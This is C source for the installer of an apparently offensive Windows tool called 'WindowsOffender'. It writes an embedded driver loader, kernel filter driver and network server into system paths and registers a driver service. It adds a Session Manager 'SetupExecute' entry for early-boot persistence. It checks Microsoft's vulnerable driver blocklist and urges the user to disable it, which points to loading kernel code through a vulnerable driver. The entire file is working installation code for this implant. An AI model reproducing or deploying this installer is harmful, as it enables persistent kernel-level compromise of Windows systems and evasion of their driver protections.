#include "Installer.h"


BOOL InsUnpackImages(void)
{

    BOOL returnValue = TRUE;
    BOOL driverLoaderUnpacked = FALSE;
    BOOL driverUnpacked = FALSE;
    BOOL serverUnpacked = FALSE;


    // We dont free the resources in case smth goes wrong cuz we're gonna exit anyways then

    PBIN_RESOURCE driverLoaderBinResource = InsUtGetBinResource("RESOURCE_DRIVER_LOADER", "BINARY");
    PBIN_RESOURCE driverBinResource = InsUtGetBinResource("RESOURCE_DRIVER", "BINARY");
    PBIN_RESOURCE serverBinResource = InsUtGetBinResource("RESOURCE_SERVER", "BINARY");

    if (driverLoaderBinResource == NULL || driverBinResource == NULL || serverBinResource == NULL)
    {
        ERRO("Failed to load one or more image file resources");

        returnValue = FALSE;

        goto _InsUnpackImages_Cleanup;
    }

    if (!InsUtWriteBinResourceToFile(driverLoaderBinResource, "\\\\.\\GLOBALROOT\\"DRIVER_LOADER_IMAGE_PATH))
    {
        ERRO("Failed to write driver loader to %s", "\\\\.\\GLOBALROOT\\"DRIVER_LOADER_IMAGE_PATH);

        returnValue = FALSE;

        goto _InsUnpackImages_Cleanup;
    }
    driverLoaderUnpacked = TRUE;

    if (!InsUtWriteBinResourceToFile(driverBinResource, "\\\\.\\GLOBALROOT\\"DRIVER_IMAGE_PATH))
    {
        ERRO("Failed to write driver to %s", "\\\\.\\GLOBALROOT\\"DRIVER_IMAGE_PATH);

        returnValue = FALSE;

        goto _InsUnpackImages_Cleanup;
    }
    driverUnpacked = TRUE;

    if (!InsUtWriteBinResourceToFile(serverBinResource, "\\\\.\\GLOBALROOT\\"SERVER_IMAGE_PATH))
    {
        ERRO("Failed to write server to %s", "\\\\.\\GLOBALROOT\\"SERVER_IMAGE_PATH);

        returnValue = FALSE;

        goto _InsUnpackImages_Cleanup;
    }
    serverUnpacked = TRUE;


    _InsUnpackImages_Cleanup:

    // Here we do, even tho it wouldnt make a shit difference if we wouldnt but this makes me feel better
    InsUtFreeBinResource(driverLoaderBinResource);
    InsUtFreeBinResource(driverBinResource);
    InsUtFreeBinResource(serverBinResource);

    if(!returnValue)
    {
        if(driverLoaderUnpacked)
        {
            DeleteFileA("\\\\.\\GLOBALROOT\\"DRIVER_LOADER_IMAGE_PATH);
        }

        if(driverUnpacked)
        {
            DeleteFileA("\\\\.\\GLOBALROOT\\"DRIVER_IMAGE_PATH);
        }

        if(serverUnpacked)
        {
            DeleteFileA("\\\\.\\GLOBALROOT\\"SERVER_IMAGE_PATH);
        }

    }

    return returnValue;
}


BOOL InsCreateServices(SC_HANDLE scmHandle)
{

    SC_HANDLE driverServiceHandle = InsUtCreateServiceEasy(scmHandle, DRIVER_IMAGE_PATH, DRIVER_NAME, SERVICE_DEMAND_START, TRUE);

    if (driverServiceHandle == NULL)
    {
        ERRO("Failed to create driver service");

        return FALSE;
    }

    CloseServiceHandle(driverServiceHandle);

    return TRUE;
}


void entry(void)

{
    UINT exitCode = 0;
    HKEY ciConfigKeyHandle = { 0 };
    DWORD vulnerableDriverBlocklistEnableValue = 0;
    DWORD vulnerableDriverBlocklistEnableValueSize = sizeof(DWORD);
    DWORD vulnerableDriverBlocklistValueType = REG_DWORD;

    INFO("Welcome to the WindowsOffender installer");
    WARN("The current version of the installer does NOT add any firewall rule for the server");
    WARN("Make sure that the server isn't blocked by the system's firewall");
    INFO("To confirm the installation press Y");

    int getchConfirmChar = getch();

    if (getchConfirmChar != 'Y' && getchConfirmChar != 'y')
    {

        INFO("Installation aborted");

        goto _entry_ExitProcess;
    }

    INFO("Installing WindowsOffender...");


    if(RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
        0,
        KEY_QUERY_VALUE,
        &ciConfigKeyHandle) != ERROR_SUCCESS)
    {
        WARN("Failed to open ci Config registry key, unable to detect vulnerable driver blocklist");
    }
    else
    {
        RegQueryValueExA(
        ciConfigKeyHandle,
        "VulnerableDriverBlocklistEnable",
        NULL,
        &vulnerableDriverBlocklistValueType,
        (LPBYTE)&vulnerableDriverBlocklistEnableValue,
        &vulnerableDriverBlocklistEnableValueSize);

        RegCloseKey(ciConfigKeyHandle);


        if(vulnerableDriverBlocklistEnableValue)
        {
            WARN("Detected vulnerable driver blocklist");
            WARN("It is HIGHLY recommend to turn it off before installing WindowsOffender");
            QUES("Do you want to continue? [Y/N]");

            getchConfirmChar = getch();

            if (getchConfirmChar != 'Y' && getchConfirmChar != 'y')
            {

                INFO("Installation aborted");

                goto _entry_ExitProcess;
            }

        }

    }
    
    INFO("Unpacking images...");

    if (!InsUnpackImages())
    {

        exitCode = 1;
        goto _entry_ExitProcess;
    }

    INFO("Opening SCM...");

        SC_HANDLE scmHandle = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);

        if (scmHandle == NULL)
        {
            ERRO("Failed to open SCM");

            exitCode = 1;
            goto _entry_ExitProcess;
    }

    INFO("Creating services...");

    if (!InsCreateServices(scmHandle))
    {
        CloseServiceHandle(scmHandle);
        exitCode = 1;
        goto _entry_ExitProcess;
    }

    CloseServiceHandle(scmHandle);


    INFO("Creating filter driver instance...");

    // Set the default instance for the driver (necessary for fs filter drivers, microsoft likes to make it extra complicated)
    if (!InsUtEasyRegSetKeyValueExA64(HKEY_LOCAL_MACHINE,
                                    "SYSTEM\\CurrentControlSet\\Services\\"DRIVER_NAME"\\Instances",
                                    "DefaultInstance",
                                    REG_SZ,
                                    "Instance1",
                                    strlen("Instance1"),
                                    REG_OPTION_NON_VOLATILE,
                                    FALSE))
    {
        ERRO("Failed to set default instance");

        exitCode = 1;
        goto _entry_ExitProcess;
    }

    char* fsFilterDriverAltitude = "404600";

    // Configure Instance1's altitude
    if (!InsUtEasyRegSetKeyValueExA64(HKEY_LOCAL_MACHINE,
                                    "SYSTEM\\CurrentControlSet\\Services\\"DRIVER_NAME"\\Instances\\Instance1",
                                    "Altitude",
                                    REG_SZ,
                                    fsFilterDriverAltitude,
                                    strlen(fsFilterDriverAltitude),
                                    REG_OPTION_NON_VOLATILE,
                                    FALSE))
    {
        ERRO("Failed to configure the default instance");

        RegDeleteTreeA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"DRIVER_NAME);

        exitCode = 1;
        goto _entry_ExitProcess;
    }

    DWORD InstanceFlags = 0x00000000;

    // Configure Instance1's flags
    if (!InsUtEasyRegSetKeyValueExA64(HKEY_LOCAL_MACHINE,
                                    "SYSTEM\\CurrentControlSet\\Services\\"DRIVER_NAME"\\Instances\\Instance1",
                                    "Flags",
                                    REG_DWORD,
                                    (PBYTE)&InstanceFlags,
                                    sizeof(DWORD),
                                    REG_OPTION_NON_VOLATILE,
                                    FALSE))
    {
        
        ERRO("Failed to configure the default instance");

        RegDeleteTreeA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"DRIVER_NAME);

        exitCode = 1;
        goto _entry_ExitProcess;
    }


    INFO("Creating SetupExecute entry...");

    if (!InsUtEasyRegSetKeyValueExA64(HKEY_LOCAL_MACHINE,
                                    "SYSTEM\\CurrentControlSet\\Control\\Session Manager",
                                    "SetupExecute",
                                    REG_MULTI_SZ,
                                    DRIVER_LOADER_NAME,
                                    strlen(DRIVER_LOADER_NAME),
                                    REG_OPTION_NON_VOLATILE,
                                    FALSE /*dont u ever DARE set this to TRUE this caused mental death and universe life questioning if i am real because i got so confused why the system would bugcheck, after all i just misremembered this parameter*/))
    {
        ERRO("Failed to write setupexecute entry");

        RegDeleteTreeA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"DRIVER_NAME);

        exitCode = 1;
        goto _entry_ExitProcess;
    }

    INFO("Done!");

    INFO("You need to reboot for WindowsOffender to function");
    QUES("Do you want to reboot now? [Y/N]");

    int rebootGetchInput = getch();

    if (rebootGetchInput == 'Y' || rebootGetchInput == 'y')
    {

        InsUtEnablePrivilegeForCurrentProcessToken("SeShutdownPrivilege");

        // Initiate a system reboot
        if(!InitiateSystemShutdownA(NULL, NULL, 0, FALSE, TRUE))
        {
            ERRO("Failed to reboot system, please reboot manually");
            goto _entry_ExitProcess;
        }

        ExitProcess(exitCode);
    }

// whoever complains abt me using a label gets banned
_entry_ExitProcess:

    INFO("Press any key to exit...");
    getch();
    ExitProcess(exitCode);
}